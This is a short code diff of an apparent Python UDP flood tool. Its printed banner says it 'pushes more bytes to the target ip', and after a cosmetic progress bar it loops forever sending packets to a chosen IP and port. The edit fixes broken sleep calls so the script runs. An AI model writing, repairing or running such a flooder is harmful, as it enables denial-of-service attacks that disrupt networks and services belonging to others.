@@ -44,13 +44,13 @@ print("This Mod pushes more bytes to the target ip, this mod also has a faster l
 print("[                    ] 0%")
 time.sleep(0)
 print("[=====               ] 25%")
-time.sleep()
+time.sleep(0)
 print("[==========          ] 50%")
-time.sleep()
+time.sleep(0)
 print("[===============     ] 75%")
-time.sleep()
+time.sleep(0)
 print("[====================] 100%")
-time.sleep()
+time.sleep(0)
 sent = 0
 while True:
      sock.sendto(bytes, (ip, port))
